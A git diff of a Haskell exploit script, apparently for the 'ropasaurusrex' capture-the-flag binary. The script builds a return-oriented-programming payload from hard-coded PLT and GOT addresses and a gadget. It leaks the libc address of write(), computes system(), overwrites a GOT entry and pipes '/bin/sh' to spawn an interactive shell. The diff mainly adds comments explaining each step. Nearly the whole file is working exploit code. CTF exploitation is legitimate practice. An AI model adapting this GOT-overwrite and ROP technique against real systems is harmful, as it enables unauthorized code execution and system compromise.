@@ -1,5 +1,5 @@
 #!/usr/bin/env stack
--- stack --resolver=lts-3.11 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix --package=conduit-extra
+-- stack --resolver=lts-3.11 runghc --package=shelly --package=bytestring --package=text --package=binary --package=unix --package=conduit-extra --package=conduit-combinators
 
 -- This gives us an experience similar to @ghci@.  Raw values (1 and
 -- 10 below) that implement the 'Num' type class will be defaulted to 'Int'
@@ -22,16 +22,12 @@
 -- certain types.  It's okay because this is just shell programming.
 {-# OPTIONS_GHC -fno-warn-type-defaults #-}
 
-import Control.Concurrent (threadDelay)
 import Control.Concurrent.Async (Concurrently(..))
-import Control.Monad.IO.Class (liftIO)
 import Data.Binary (encode, decode)
-import qualified Data.ByteString as B
-import qualified Data.ByteString.Char8 as C8
 import qualified Data.ByteString.Lazy as BL
 import Data.ByteString.Lazy (ByteString)
-import Data.Conduit (($$), (=$), yield)
-import Data.Conduit.Binary as CB
+import Data.Conduit (($$), yield)
+import Data.Conduit.Combinators (stdin, stdout)
 import Data.Conduit.List as CL
 import Data.Conduit.Process (streamingProcess, waitForStreamingProcess)
 import Data.Maybe (fromJust)
@@ -39,7 +35,7 @@ import Data.Monoid ((<>))
 import qualified Data.Text as T
 import GHC.Word (Word32, Word8, byteSwap32)
 import Numeric (showHex)
-import System.IO (Handle, stdin, stderr)
+import System.IO (Handle, stderr)
 import System.Process (shell)
 
 -- Define the the types that should be defaulted to.  We can define one
@@ -60,44 +56,37 @@ padTo fullBufLength string = nopSled <> string
     nopSled :: ByteString
     nopSled = BL.replicate (fromInteger paddingLen) nop
 
+-- | Turns a 'Word32' into a memory address.
+--
+-- It swaps the byte order.
 toAddr :: Word32 -> Word32
 toAddr = byteSwap32
 
 nops :: ByteString
 nops = BL.replicate 140 nop
 
+-- | Addr of 'read' in the plt.
 readAddrPLT :: Word32
 readAddrPLT = toAddr 0x804832c
 
+-- | Addr of 'read' in the got.
 readAddrGOT :: Word32
--- this is the plt address
--- readAddress = toAddr 0x804832c
--- this is the got address
 readAddrGOT = toAddr 0x804961c
 
--- this is the plt address
 writeAddrPLT :: Word32
 writeAddrPLT = toAddr 0x804830c
 
--- this is the got address
 writeAddressGOT :: Word32
 writeAddressGOT = toAddr 0x8049614
 
+-- | Addr of a @pop, pop, pop, ret@ sequence.
 popPopPopRetAddr :: Word32
 popPopPopRetAddr = toAddr 0x080484b6
 
+-- | Offset of 'system' in Arch's libc.so.
 systemOffset :: Word32
 systemOffset = 0x0009d990
 
--- TODO: This successfully prints out the address of the of write() in
--- libc, and tries to read in an address of system() to write() to
--- write()'s GOT entry.
---
--- Next, in Haskell I need to read() in the value of write()'s GOT, use it
--- to figure out the offset of system(), so that the call to read() can
--- write it to write()'s GOT.  Then I need to call write() one more time so
--- that it actually calls system().  Also need to figure out what arguments
--- to pass to system().
 paddedExploit :: ByteString
 paddedExploit = nops
     <> encode writeAddrPLT          -- print out address of write() to stdout.
@@ -130,39 +119,43 @@ main = do
     BL.hPutStr stderr "-- Started. --\n"
     BL.hPutStr stderr "---------------\n\n"
 
+    -- open the ropasaurauxrex binary
     (processStdin, processStdout, _ :: Handle, processHandle) <- streamingProcess $
         shell "./ropasaurusrex-85a84f36f81e11f720b1cf5ea0d1fb0d5a603c0d"
 
-    -- BL.putStrLn paddedExploit
+    -- send the exploit to ropasaurusrex's stdin
     yield (BL.toStrict paddedExploit) $$ processStdin
+
+    -- read the addr of write in libc from ropasaurusrex's stdout
     writeAddrRaw <- fromJust <$> (processStdout $$ CL.head)
+
+    -- calculate the value of 'system' based on the value of 'write'
     let writeAddr = toAddr . decode $ BL.fromStrict writeAddrRaw
     let systemAddr = toAddr (writeAddr - systemOffset)
+
     putStrLn $ showHex writeAddr ""
     putStrLn $ showHex systemOffset ""
     putStrLn $ showHex (toAddr systemAddr) ""
+
+    -- send the calculated address of 'system' to ropasaurusrex's stdin
     yield (BL.toStrict $ encode systemAddr) $$ processStdin
 
-    -- putStrLn "waiting..."
-    -- threadDelay $ 1000000 * 1
-    -- putStrLn "done waiting."
-
+    -- send the @/bin/sh@ string to ropasaurusrex's stdin
     yield "/bin/sh\0" $$ processStdin
-    -- output <- processStdout $$ CL.consume
-    -- putStrLn $ "output: " <> show output
 
-    let input = CB.sourceHandle stdin
-                    $$ processStdin
-        output = processStdout
-                    $$ CB.mapM_ (\bs -> putStr $ [toEnum $ fromEnum bs])
+    -- make two conduits that feed breaker.hs's stdin to ropasaurusrex's
+    -- stdin, and ropasaurusrex's stdout to breaker.hs's stdout.  This lets us
+    -- easily control the shell that will spawn.
+    -- let input = CB.sourceHandle stdin $$ processStdin
+    let stdinToRopasaurusrexStdin = stdin $$ processStdin
+        ropasaurusrexStdoutToStdout = processStdout $$ stdout
 
-
+    -- run our input and output conduits concurrently
     exitCode <- runConcurrently $
-                    Concurrently input *>
-                    Concurrently output *>
+                    Concurrently stdinToRopasaurusrexStdin *>
+                    Concurrently ropasaurusrexStdoutToStdout *>
                     Concurrently (waitForStreamingProcess processHandle)
 
-    -- exitCode <- waitForStreamingProcess processHandle
     putStrLn $ "exitCode: " <> show exitCode
 
     BL.hPutStr stderr "\n"
